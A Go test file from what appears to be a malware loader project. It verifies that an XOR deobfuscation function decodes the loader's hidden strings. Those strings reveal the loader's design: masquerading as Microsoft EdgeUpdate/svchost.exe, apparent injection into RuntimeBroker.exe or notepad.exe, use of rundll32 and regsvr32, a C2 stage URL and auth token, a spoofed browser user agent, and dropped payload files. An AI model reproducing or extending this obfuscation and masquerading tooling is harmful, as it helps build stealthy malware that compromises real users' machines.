package main

import "testing"

// Regression guard: xob() must decode with the SAME key that
// scripts/bake_loader_secrets.py / scripts/xor_encode.py use to ENCODE. If
// the two sides drift, every baked config value in the loader silently
// becomes garbage (the 2026-09-20 agent 1-byte-key bug — baked stage URL and
// token undecodable, loader deaf).
func TestXobMatchesBakeScripts(t *testing.T) {
	cases := []struct {
		name string
		enc  []byte
		want string
	}{
		{"host_proc", eHostProc, `C:\Windows\System32\RuntimeBroker.exe`},
		{"default_proc", eDefaultProc, "notepad.exe"},
		{"ntdll_path", eNTDLLPath, `C:\Windows\System32\ntdll.dll`},
		{"svc_name", eSvcName, "EdgeUpdate"},
		{"svchost_pf", eSvchostPF, `C:\Program Files (x86)\Microsoft\EdgeUpdate\svchost.exe`},
		{"svchost_pd", eSvchostPD, `C:\ProgramData\Microsoft\EdgeUpdate\svchost.exe`},
		{"agent_name", eAgentName, "agent.exe"},
		{"payload_name", ePayloadName, "payload.bin"},
		{"drop_fmt", eDropFmt, "dv%d.tmp"},
		{"hdr_auth", eHdAuth, "X-Auth-Token"},
		{"ua", eUA, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},
		{"env_stage_url", eEnvStageURL, "C2_STAGE_URL"},
		{"env_stage_token", eEnvStageToken, "STAGE_AUTH_TOKEN"},
		{"kernel32", eKernel32, "kernel32.dll"},
		{"env_agent_path", eEnvAgentPath, "AGENT_PATH"},
		{"env_payload_path", eEnvPayloadPath, "PAYLOAD_PATH"},
		{"env_retry_wait", eEnvRetryWait, "STAGE_RETRY_WAIT"},
		{"rundll32", eRundll32, "rundll32.exe"},
		{"regsvr32", eRegsvr32, "regsvr32.exe"},
	}
	for _, c := range cases {
		if got := xob(c.enc); got != c.want {
			t.Errorf("%s: xob() = %q, want %q", c.name, got, c.want)
		}
	}
}
